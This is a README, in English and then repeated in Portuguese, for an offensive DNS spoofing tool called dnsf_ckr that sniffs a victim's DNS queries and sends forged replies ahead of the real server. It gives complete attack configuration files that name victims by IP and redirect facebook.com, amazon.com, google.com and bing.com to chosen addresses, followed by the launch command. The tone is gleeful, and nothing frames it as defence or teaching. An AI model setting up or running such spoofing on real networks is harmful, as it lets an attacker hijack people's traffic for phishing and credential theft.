Dnsf_ckr
--------

(sorry my bad english...)

dnsf_ckr is a application used for messing up with domain names. Until now it works on FreeBSD.

The idea here is sniffing victim's dns requests and fake the response as soon as possible than real dns server.
In this way is possible redirect the target machine to anywhere we want.

MuHAuHaUHauHAuHAHuha! :P

## Using dnsf_ckr

At first you need to know three things

    * The victim's ip address
    * The victim's real DNS server IP
    * What domain names you wish to spoof

These informations must be supplied to dnsf_ckr through a configuration file.

Suposing that yours victim is called "sheep" and has the ip address "192.30.70.9" and accesses the "www.facebook.com",
we have the following attack configuration:

        # dnsf_ckr attack config sample

        # at first, you have to declare your victim alias

        victims =
            sheep: 192.30.70.9
        ;

        # sheep requests name resolutions in 192.30.70.200 (from now on called "cheap-server")

        dns-servers =
            cheap-server: 192.30.70.200
        ;

        # and so, the domain that your victim accesses and which you want to spoof, in form <domain>:<spoofed-ip>

        namelist boring-sites =
            www.facebook.com: 192.30.70.101
        ;

        # finally, you inform your intentions to dnsf_ckr

        fake-nameserver =
            with sheep mess up boring-sites
        ;

        # but yet we need to describe how valid transactions (in normal conditions, e.g. not spoofed) should be occur.

        real-dns-transactions =
            sheep sends requests to cheap-server
        ;

Okay, now you want to add a new attack based on a new victim and also direct the "sheep" for others wilder domains:

        victims =
            sheep: 192.30.70.9
            obama: 192.30.70.21
        ;

        dns-servers =
            cheap-server: 192.30.70.200
        ;

        namelist boring-sites =
            www.facebook.com: 192.30.70.101
        ;

        namelist webcommerce-sites =
            www.amazon.com: 192.30.70.101
            www.buy-buy-baby-buy-buy.com: 192.30.70.101
            www.good-buy.com: 192.30.70.101
        ;

        namelist search-engines =
            www.bing.com: 192.30.70.102
            www.google.com: 192.30.70.101
            www.goduck.com: 192.30.70.103
        ;

        real-dns-transactions =
            sheep sends requests to cheap-server
            obama sends requests to cheap-server
        ;

        fake-nameserver =
            with sheep mess up boring-sites, webcommerce-sites
            with obama mess up search-engines
        ;

Now, if the presented configuration data is into "my-dirty-little-hacking.conf" file... all we need to do is:

        ./dnsf_ckr --attack-map=my-dirty-little-hacking.conf --iface=em1

The option --iface indicates the name of the interface that you use to access the network.

Have fun!
Santiago


Dnsf_ckr
--------

dnsf_ckr e uma aplicacao usada para baguncar com nomes de dominios. Ate agora isso funciona no FreeBSD.

A ideia aqui e sniffar as requisicoes dns da vitima e falsificar a resposta o quanto antes que o servidor dns real.
Dessa forma e possivel redirecionar a maquina alvo para onde nos quisermos.

MuHAuHaUHauHAuHAHuha! :P

## Usando o dnsf_ckr

Inicialmente voce precisa saber tres coisas

    * O endereco ip da vitima
    * O endereco ip do servidor DNS real da vitima
    * Quais nomes de dominio voce quer spoofar

Essas informacoes devem ser informadas ao dnsf_ckr atraves do arquivo de configuracao.

Supondo que sua vitima e chamada "sheep" e tem o endereco ip "192.30.70.9" e acessa o "www.facebook.com", nos temos
a seguinte configuracao de ataque:

        # dnsf_ckr attack config sample

        # at first, you have to declare your victim alias

        victims =
            sheep: 192.30.70.9
        ;

        # sheep requests name resolutions in 192.30.70.200 (from now on called "cheap-server")

        dns-servers =
            cheap-server: 192.30.70.200
        ;

        # and so, the domain that your victim accesses and which you want to spoof, in form <domain>:<spoofed-ip>

        namelist boring-sites =
            www.facebook.com: 192.30.70.101
        ;

        # finally, you inform your intentions to dnsf_ckr

        fake-nameserver =
            with sheep mess up boring-sites
        ;

        # but yet we need to describe how valid transactions (in normal conditions, e.g. not spoofed) should be occur.

        real-dns-transactions =
            sheep sends requests to cheap-server
        ;

Certo, agora voce quer adicionar um novo ataque baseado em uma nova vitima e direcionar "sheep" para outros dominios mais selvagens:

        victims =
            sheep: 192.30.70.9
            obama: 192.30.70.21
        ;

        dns-servers =
            cheap-server: 192.30.70.200
        ;

        namelist boring-sites =
            www.facebook.com: 192.30.70.101
        ;

        namelist webcommerce-sites =
            www.amazon.com: 192.30.70.101
            www.buy-buy-baby-buy-buy.com: 192.30.70.101
            www.good-buy.com: 192.30.70.101
        ;

        namelist search-engines =
            www.bing.com: 192.30.70.102
            www.google.com: 192.30.70.101
            www.goduck.com: 192.30.70.103
        ;

        real-dns-transactions =
            sheep sends requests to cheap-server
            obama sends requests to cheap-server
        ;

        fake-nameserver =
            with sheep mess up boring-sites, webcommerce-sites
            with obama mess up search-engines
        ;

Agora, se os dados de configuracao apresentados estao dentro do arquivo "my-dirty-little-hacking.conf"... tudo o que precisamos fazer e:

        ./dnsf_ckr --attack-map=my-dirty-little-hacking.conf --iface=em1

A opcao --iface indica o nome da interface que voce usa para acessar a rede.

Divirta-se!
Santiago
